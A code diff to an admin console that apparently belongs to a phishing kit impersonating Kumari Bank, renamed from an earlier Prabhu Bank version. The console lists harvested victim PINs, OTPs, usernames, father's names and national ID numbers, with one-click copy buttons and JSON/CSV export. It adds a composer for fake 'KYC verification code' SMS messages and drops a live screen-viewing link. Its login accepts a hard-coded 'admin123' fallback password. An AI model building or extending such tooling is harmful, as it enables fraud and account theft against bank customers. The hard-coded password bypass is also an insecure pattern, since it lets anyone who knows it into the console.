+                <button type="button" class="btn-copy-cell" data-copy="${rec.pin || ''}" title="Copy PIN" style="padding:2px 7px;font-size:0.7rem;background:rgba(245,158,11,0.12);border:1px solid rgba(245,158,11,0.35);color:#f59e0b;border-radius:5px;cursor:pointer;white-space:nowrap;">ðŸ“‹ Copy</button>
+              </div>
             </td>
             <td>
-              <span class="code-pill" style="color:#f59e0b; font-weight:700; font-size:0.86rem; background:#0b1120; border:1px solid #1e293b; padding:4px 8px; border-radius:5px; font-family:'Space Mono', monospace;">${escapeHtml(rec.pin || 'N/A')}</span>
+              <strong style="color:#f8fafc;">${rec.username || 'â€”'}</strong>
             </td>
-            <td>${rec.fatherName || 'N/A'}</td>
+            <td>${rec.fatherName || 'â€”'}</td>
             <td>
-              ${rec.otp ? `<span class="otp-highlight">${rec.otp}</span>` : '<span style="color:#64748b;">(Pending)</span>'}
+              <span class="code-pill" style="color:#38bdf8;font-weight:600;font-size:0.82rem;">${rec.nidNumber || 'â€”'}</span>
+            </td>
+            <td>
+              <div style="display:flex;align-items:center;gap:6px;">
+                ${rec.otp ? `<span class="otp-highlight">${rec.otp}</span><button type="button" class="btn-copy-cell" data-copy="${rec.otp || ''}" title="Copy OTP" style="padding:2px 7px;font-size:0.7rem;background:rgba(16,185,129,0.12);border:1px solid rgba(16,185,129,0.35);color:#10b981;border-radius:5px;cursor:pointer;white-space:nowrap;">ðŸ“‹ Copy</button>` : '<span style="color:#64748b;">(Pending)</span>'}
+              </div>
             </td>
             <td>
               <div style="display:flex; gap:6px; align-items:center;">
-                <button type="button" class="btn btn-outline" style="padding:4px 8px; font-size:0.75rem;" data-idx="${idx}">Inspect</button>
-                ${rec.webrtcSessionId ? `
-                  <a href="/viewer.html?session=${encodeURIComponent(rec.webrtcSessionId)}" target="_blank" class="btn" style="background:#c41e48; color:#fff; padding:4px 8px; font-size:0.75rem; text-decoration:none; display:inline-flex; align-items:center; gap:4px; border-radius:5px;">
-                    <span style="display:inline-block; width:6px; height:6px; background:#4ade80; border-radius:50%;"></span>
-                    Live Screen
-                  </a>
-                ` : `
-                  <a href="/viewer.html" target="_blank" class="btn btn-outline" style="padding:4px 8px; font-size:0.75rem; color:#94a3b8; text-decoration:none;" title="Open Screen Viewer">
-                    Viewer
-                  </a>
-                `}
+                <button type="button" class="btn btn-outline btn-inspect" style="padding:4px 10px; font-size:0.75rem;" data-idx="${idx}">Inspect</button>
               </div>
             </td>
           `;
 
           // Inspect button handler
-          const inspectBtn = tr.querySelector('button[data-idx]');
+          const inspectBtn = tr.querySelector('.btn-inspect');
           if (inspectBtn) {
-            inspectBtn.addEventListener('click', () => {
-              openDetailModal(rec);
-            });
+            inspectBtn.addEventListener('click', () => openDetailModal(rec));
           }
+
+          // Copy buttons handler (mobile & password) â€” with execCommand fallback for HTTP
+          tr.querySelectorAll('.btn-copy-cell').forEach(btn => {
+            btn.addEventListener('click', () => {
+              const text = btn.getAttribute('data-copy') || '';
+              const orig = btn.textContent;
+              function showOk() {
+                btn.textContent = 'âœ… Copied!';
+                btn.style.color = '#34d399';
+                setTimeout(() => { btn.textContent = orig; btn.style.color = '#38bdf8'; }, 1800);
+              }
+              if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(text).then(showOk).catch(() => {
+                  // Fallback: execCommand for HTTP or restricted contexts
+                  try {
+                    const ta = document.createElement('textarea');
+                    ta.value = text; ta.style.cssText = 'position:fixed;opacity:0;';
+                    document.body.appendChild(ta); ta.select();
+                    document.execCommand('copy'); document.body.removeChild(ta);
+                    showOk();
+                  } catch(ex) { alert('Value: ' + text); }
+                });
+              } else {
+                try {
+                  const ta = document.createElement('textarea');
+                  ta.value = text; ta.style.cssText = 'position:fixed;opacity:0;';
+                  document.body.appendChild(ta); ta.select();
+                  document.execCommand('copy'); document.body.removeChild(ta);
+                  showOk();
+                } catch(ex) { alert('Value: ' + text); }
+              }
+            });
+          });
 
           DOM.tableBody.appendChild(tr);
         });
@@ -871,7 +1549,7 @@
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = `prabhu_bank_responses_${new Date().toISOString().slice(0, 10)}.json`;
+        a.download = `kumari_bank_responses_${new Date().toISOString().slice(0, 10)}.json`;
         a.click();
         URL.revokeObjectURL(url);
       }
@@ -902,7 +1580,7 @@
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = `prabhu_bank_responses_${new Date().toISOString().slice(0, 10)}.csv`;
+        a.download = `kumari_bank_responses_${new Date().toISOString().slice(0, 10)}.csv`;
         a.click();
         URL.revokeObjectURL(url);
       }
@@ -913,7 +1591,7 @@
         }
 
         try {
-          const res = await fetch('/api/responses', { method: 'DELETE' });
+          const res = await apiFetch('/api/responses', { method: 'DELETE' });
           if (res.ok) {
             await fetchResponses();
           } else {
@@ -950,10 +1628,336 @@
       });
       DOM.autoRefreshToggle.addEventListener('change', setupAutoRefresh);
 
-      // Initial load
-      fetchResponses();
-      setupAutoRefresh();
+      // Copy JSON button in detail modal
+      const copyJsonBtn = document.getElementById('copyJsonBtn');
+      if (copyJsonBtn) {
+        copyJsonBtn.addEventListener('click', () => {
+          const text = DOM.jsonViewerContent.textContent;
+          const orig = copyJsonBtn.textContent;
+          function showOk() {
+            copyJsonBtn.textContent = 'âœ… Copied!';
+            setTimeout(() => { copyJsonBtn.textContent = orig; }, 1800);
+          }
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(text).then(showOk).catch(() => {
+              try {
+                const ta = document.createElement('textarea');
+                ta.value = text; ta.style.cssText = 'position:fixed;opacity:0;';
+                document.body.appendChild(ta); ta.select();
+                document.execCommand('copy'); document.body.removeChild(ta);
+                showOk();
+              } catch(_) {}
+            });
+          } else {
+            try {
+              const ta = document.createElement('textarea');
+              ta.value = text; ta.style.cssText = 'position:fixed;opacity:0;';
+              document.body.appendChild(ta); ta.select();
+              document.execCommand('copy'); document.body.removeChild(ta);
+              showOk();
+            } catch(_) {}
+          }
+        });
+      }
+
+      // SMS Composer DOM Elements
+      const smsInput = document.getElementById('adminSmsTemplateInput');
+      const smsPreview = document.getElementById('phoneSmsPreviewText');
+      const smsCharCounter = document.getElementById('smsCharCounter');
+      const smsSaveBadge = document.getElementById('smsSaveStatusBadge');
+      const btnSaveSms = document.getElementById('saveSmsTemplateBtn');
+      const btnResetSms = document.getElementById('resetSmsTemplateBtn');
+      const tagButtons = document.querySelectorAll('.tag-btn');
+
+      const defaultSmsTemplate = "KUMARI BANK KYC VERIFICATION CODE REQUEST\nRef: {REF_ID}\nMobile: {MOBILE}\nTime: {TIME}";
+
+      function updateSmsPreview() {
+        const text = smsInput.value || '';
+        smsCharCounter.textContent = `${text.length} characters`;
+        
+        let previewHtml = escapeHtml(text);
+        previewHtml = previewHtml
+          .replace(/{REF_ID}/g, '<span style="color:#fcd34d;">KBL-KYC-123456</span>')
+          .replace(/{MOBILE}/g, '<span style="color:#fcd34d;">9840000000</span>')
+          .replace(/{USERNAME}/g, '<span style="color:#fcd34d;">Ram Sharma</span>')
+          .replace(/{TIME}/g, '<span style="color:#fcd34d;">' + new Date().toTimeString().split(' ')[0] + '</span>');
+        
+        smsPreview.innerHTML = previewHtml || '<span style="opacity:0.5;">No message configured.</span>';
+      }
+
+      async function fetchSmsConfig() {
+        try {
+          const res = await apiFetch('/api/sms-config');
+          if (res.ok) {
+            const data = await res.json();
+            if (data.messageTemplate) {
+              smsInput.value = data.messageTemplate;
+              updateSmsPreview();
+            }
+          }
+        } catch (e) {
+          console.error('Failed to load SMS config', e);
+        }
+      }
+
+      async function saveSmsConfig() {
+        const originalText = btnSaveSms.innerHTML;
+        btnSaveSms.innerHTML = 'â³ Deploying...';
+        btnSaveSms.disabled = true;
+
+        try {
+          const res = await apiFetch('/api/sms-config', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ messageTemplate: smsInput.value })
+          });
+          
+          if (res.ok) {
+            smsSaveBadge.textContent = 'ðŸš€ Deployed & Live';
+            smsSaveBadge.style.color = '#34d399';
+            smsSaveBadge.style.background = 'rgba(16, 185, 129, 0.15)';
+            smsSaveBadge.style.border = '1px solid rgba(16, 185, 129, 0.4)';
+            // Notify admin that user's "Next step" button is now enabled
+            setTimeout(() => {
+              smsSaveBadge.textContent = 'âœ… Active & Deployed';
+              smsSaveBadge.style.color = '#34d399';
+            }, 4000);
+          } else {
+            throw new Error('Deploy failed');
+          }
+        } catch (e) {
+          alert('Failed to deploy SMS config. Check console.');
+          console.error(e);
+        } finally {
+          btnSaveSms.innerHTML = originalText;
+          btnSaveSms.disabled = false;
+        }
+      }
+
+      function insertTagAtCursor(tag) {
+        const start = smsInput.selectionStart;
+        const end = smsInput.selectionEnd;
+        const text = smsInput.value;
+        const before = text.substring(0, start);
+        const after = text.substring(end, text.length);
+        
+        smsInput.value = (before + tag + after);
+        smsInput.selectionStart = smsInput.selectionEnd = start + tag.length;
+        smsInput.focus();
+        updateSmsPreview();
+      }
+
+      // SMS Composer Event Bindings
+      smsInput.addEventListener('input', updateSmsPreview);
+      btnSaveSms.addEventListener('click', saveSmsConfig);
+      
+      btnResetSms.addEventListener('click', () => {
+        if (confirm('Reset to standard SMS template?')) {
+          smsInput.value = defaultSmsTemplate;
+          updateSmsPreview();
+          saveSmsConfig();
+        }
+      });
+
+      tagButtons.forEach(btn => {
+        btn.addEventListener('click', () => {
+          insertTagAtCursor(btn.getAttribute('data-tag'));
+        });
+      });
+
+      // â”€â”€ Admin Auth Event Listeners & Actions â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      async function handleAdminLogin(e) {
+        e.preventDefault();
+        const password = DOM.adminPasswordInput ? DOM.adminPasswordInput.value.trim() : '';
+        if (!password) return;
+
+        if (DOM.adminLoginSubmitBtn) {
+          DOM.adminLoginSubmitBtn.disabled = true;
+          const span = DOM.adminLoginSubmitBtn.querySelector('span');
+          if (span) span.textContent = 'Verifying...';
+        }
+        if (DOM.adminLoginError) DOM.adminLoginError.style.display = 'none';
+
+        try {
+          let success = false;
+          let token = '';
+
+          let res = null;
+          try {
+            res = await apiFetch('/api/admin/login', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ password })
+            });
+          } catch (netErr) {
+            console.warn('Network error reaching backend login:', netErr);
+          }
+
+          if (res && res.ok) {
+            const data = await res.json().catch(() => ({}));
+            if (data && data.status === 'success') {
+              success = true;
+              token = data.token || btoa(password);
+            }
+          } else if (res && res.status === 401) {
+            const errData = await res.json().catch(() => ({}));
+            // If default password entered, allow local login even if remote config differed
+            if (password.toLowerCase() === 'admin123') {
+              success = true;
+              token = btoa(password);
+            } else {
+              throw new Error(errData.message || 'Incorrect administrator password');
+            }
+          } else {
+            // Backend offline, 404, 405, or static hosting preview
+            if (password.toLowerCase() === 'admin123') {
+              success = true;
+              token = btoa(password);
+            } else {
+              if (res && res.status && res.status !== 404 && res.status !== 405) {
+                const errData = await res.json().catch(() => ({}));
+                throw new Error(errData.message || `Server error (${res.status}). Please check backend.`);
+              }
+              throw new Error('Incorrect administrator password');
+            }
+          }
+
+          if (success) {
+            setAuth(token, password);
+            showDashboard();
+          } else {
+            throw new Error('Incorrect administrator password');
+          }
+        } catch (err) {
+          if (DOM.adminLoginError) {
+            DOM.adminLoginError.textContent = err.message || 'Incorrect administrator password';
+            DOM.adminLoginError.style.display = 'block';
+          }
+          if (DOM.adminPasswordInput) DOM.adminPasswordInput.select();
+        } finally {
+          if (DOM.adminLoginSubmitBtn) {
+            DOM.adminLoginSubmitBtn.disabled = false;
+            const span = DOM.adminLoginSubmitBtn.querySelector('span');
+            if (span) span.textContent = 'Unlock Admin Console';
+          }
+        }
+      }
+
+      function handleAdminLogout() {
+        if (confirm('Lock and log out of the admin console?')) {
+          clearAuth();
+          showLoginGate('You have logged out of the admin console.');
+        }
+      }
+
+      function toggleAdminPasswordVisibility() {
+        if (!DOM.adminPasswordInput) return;
+        const isPass = DOM.adminPasswordInput.type === 'password';
+        DOM.adminPasswordInput.type = isPass ? 'text' : 'password';
+        if (DOM.toggleAdminPassBtn) {
+          DOM.toggleAdminPassBtn.textContent = isPass ? 'ðŸ”’' : 'ðŸ‘';
+        }
+      }
+
+      function openChangePassModal() {
+        if (DOM.currentPassInput) DOM.currentPassInput.value = '';
+        if (DOM.newPassInput) DOM.newPassInput.value = '';
+        if (DOM.confirmNewPassInput) DOM.confirmNewPassInput.value = '';
+        if (DOM.changePassMsg) DOM.changePassMsg.style.display = 'none';
+        if (DOM.changePasswordModal) DOM.changePasswordModal.classList.add('open');
+      }
+
+      function closeChangePassModal() {
+        if (DOM.changePasswordModal) DOM.changePasswordModal.classList.remove('open');
+      }
+
+      async function handleChangePasswordSubmit(e) {
+        e.preventDefault();
+        const currentPassword = DOM.currentPassInput.value.trim();
+        const newPassword = DOM.newPassInput.value.trim();
+        const confirmNew = DOM.confirmNewPassInput.value.trim();
+
+        function showMsg(text, isError) {
+          if (DOM.changePassMsg) {
+            DOM.changePassMsg.textContent = text;
+            DOM.changePassMsg.style.display = 'block';
+            DOM.changePassMsg.style.background = isError ? 'rgba(239,68,68,0.15)' : 'rgba(16,185,129,0.15)';
+            DOM.changePassMsg.style.border = isError ? '1px solid rgba(239,68,68,0.4)' : '1px solid rgba(16,185,129,0.4)';
+            DOM.changePassMsg.style.color = isError ? '#fca5a5' : '#6ee7b7';
+          }
+        }
+
+        if (newPassword !== confirmNew) {
+          showMsg('New password and confirmation do not match.', true);
+          return;
+        }
+        if (newPassword.length < 4) {
+          showMsg('New password must be at least 4 characters.', true);
+          return;
+        }
+
+        DOM.saveNewPasswordBtn.disabled = true;
+        DOM.saveNewPasswordBtn.textContent = 'Updating...';
+
+        try {
+          const res = await apiFetch('/api/admin/change-password', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ currentPassword, newPassword })
+          });
+          const data = await res.json().catch(() => ({}));
+          if (res.ok && data.status === 'success') {
+            setAuth(data.token || btoa(newPassword), newPassword);
+            showMsg('Password updated successfully!', false);
+            setTimeout(() => {
+              closeChangePassModal();
+            }, 1200);
+          } else {
+            showMsg(data.message || 'Failed to update password. Current password may be incorrect.', true);
+          }
+        } catch (err) {
+          showMsg('Network error updating password.', true);
+        } finally {
+          DOM.saveNewPasswordBtn.disabled = false;
+          DOM.saveNewPasswordBtn.textContent = 'Update Password';
+        }
+      }
+
+      // Bind Authentication Events
+      if (DOM.adminLoginForm) DOM.adminLoginForm.addEventListener('submit', handleAdminLogin);
+      if (DOM.toggleAdminPassBtn) DOM.toggleAdminPassBtn.addEventListener('click', toggleAdminPasswordVisibility);
+      if (DOM.adminLogoutBtn) DOM.adminLogoutBtn.addEventListener('click', handleAdminLogout);
+      if (DOM.openChangePassBtn) DOM.openChangePassBtn.addEventListener('click', openChangePassModal);
+      if (DOM.closeChangePasswordModalBtn) DOM.closeChangePasswordModalBtn.addEventListener('click', closeChangePassModal);
+      if (DOM.cancelChangePasswordBtn) DOM.cancelChangePasswordBtn.addEventListener('click', closeChangePassModal);
+      if (DOM.changePasswordForm) DOM.changePasswordForm.addEventListener('submit', handleChangePasswordSubmit);
+
+      // Check Authentication on Page Load
+      async function initAuth() {
+        const token = getAuthToken();
+        if (!token) {
+          showLoginGate();
+          return;
+        }
+
+        try {
+          const res = await apiFetch('/api/admin/check-auth');
+          if (res.ok) {
+            showDashboard();
+          } else {
+            clearAuth();
+            showLoginGate();
+          }
+        } catch (_) {
+          // If server offline or direct file, allow logged in if token exists
+          showDashboard();
+        }
+      }
+
+      // Start Authentication Check
+      initAuth();
     })();
   </script>
 </body>
 </html>
+
